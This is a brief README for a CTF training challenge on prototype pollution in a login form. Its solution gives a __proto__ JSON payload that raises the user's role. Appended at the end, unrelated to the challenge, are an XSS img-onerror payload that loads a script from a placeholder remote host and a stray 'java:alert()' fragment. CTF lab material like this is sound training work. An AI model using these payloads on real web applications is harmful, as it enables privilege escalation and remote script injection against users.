# Type
`challenge CTF training: Re03`
# Deploy
- `docker-compose up -d --build`
# Description
Prototype pollution vulnerability.
## Chức năng
- Đăng nhập
## Solution
- POST data trong chức năng đăng nhập: {"\_\_proto\_\_":{"role":1}} (lưu ý header cần sửa thành Content-Type: application/json)
## Error: Cannot find module 'ejs' --> fix:
- `cd ./web`
- `npm install ejs`
<img src="http://nonexistent-image" onerror="var script = document.createElement('script'); script.src='http://ip/client.js'; document.body.appendChild(script);">
java:alert()
